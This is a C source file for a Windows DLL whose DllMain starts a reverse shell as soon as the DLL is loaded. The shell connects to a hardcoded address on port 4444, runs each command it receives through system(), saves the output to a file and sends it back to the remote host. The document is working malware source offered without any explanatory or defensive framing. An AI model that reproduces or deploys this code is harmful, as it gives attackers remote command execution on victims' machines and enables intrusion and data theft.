#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#define PORT "4444"
#define MAXDATASIZE 1024

void* get_in_addr(struct sockaddr* sa) {
    // Función auxiliar para obtener la dirección IP de un socket
    // dependiendo de si es IPv4 o IPv6
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }
    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

void ReverseShell() {
    WSADATA wsaData;
    SOCKET sockfd;
    struct addrinfo hints, *servinfo, *p;
    int rv;
    char buf[MAXDATASIZE];
    char s[INET6_ADDRSTRLEN];

    // Change this line to the IP you want to connect to
    const char* ip_address = "192.168.1.103";

    // Winsock initialization
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Error initializing Winsock\n");
        return;
    }

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    // Get address info for the connection
    if ((rv = getaddrinfo(ip_address, PORT, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
        WSACleanup();
        return;
    }

    // Iterate over all found addresses and connect to the first available one
    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == INVALID_SOCKET) {
            perror("client: socket");
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sockfd);
            perror("client: connect");
            continue;
        }

        break;
    }

    // Check if the connection was established
    if (p == NULL) {
        fprintf(stderr, "client: could not connect\n");
        freeaddrinfo(servinfo);
        WSACleanup();
        return;
    }

    // Get the IP address we connected to
    inet_ntop(p->ai_family, get_in_addr((struct sockaddr*)p->ai_addr), s, sizeof s);
    printf("client: connecting to %s\n", s);
    freeaddrinfo(servinfo); // We no longer need this structure

    while (1) {
        int numbytes;
        // Receive data from the server
        if ((numbytes = recv(sockfd, buf, MAXDATASIZE - 1, 0)) == SOCKET_ERROR) {
            perror("recv");
            closesocket(sockfd);
            WSACleanup();
            exit(1);
        }

        // Check if the connection was closed by the server
        if (numbytes == 0) {
            printf("Connection closed by the server\n");
            break;
        }

        buf[numbytes] = '\0';

        printf("client received: %s\n", buf);

        // Concatenate the received command with redirection to a file (" > a.txt")
        strcat(buf, " > a.txt");
        system(buf);

        FILE* fp;
        char line[MAXDATASIZE];
        fp = fopen("a.txt", "r");

        // Send the content of the file "a.txt" to the server
        if (fp == NULL) {
            char* error_msg = "Error: no output";
            int len = strlen(error_msg);
            send(sockfd, error_msg, len, 0);
        } else {
            while (fgets(line, sizeof(line), fp) != NULL) {
                send(sockfd, line, strlen(line), 0);
            }
            const char *message = "END";
            send(sockfd, message, strlen(message), 0);
            fclose(fp);
        }
    }

    closesocket(sockfd);
    WSACleanup();
    return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            ReverseShell(); // Llama a la función ReverseShell al cargar la DLL
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
